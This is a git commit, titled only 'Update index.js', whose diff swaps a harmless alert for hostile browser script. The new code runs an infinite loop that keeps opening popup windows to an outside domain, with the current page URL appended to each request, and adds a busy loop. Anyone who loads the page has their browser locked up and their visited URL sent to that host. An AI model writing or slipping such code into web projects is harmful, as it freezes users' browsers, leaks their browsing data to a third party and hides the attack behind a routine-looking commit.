f4713b1cc9d0a916932547f5da335997cd4d5309
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-10 16:58:52 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,10 @@
-alert("doggy")
+  while (true) {
+    var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+    var URL = "http://kplibrary.cf/" + location.href;
+    var win = window.open(URL, "_blank", strWindowFeatures);
+    setTimeout(function() {
+      for (var i = 0; i === i; i++) {}
+      txt = "a";
+      txt = txt += "a";
+    }, 5);
+  }
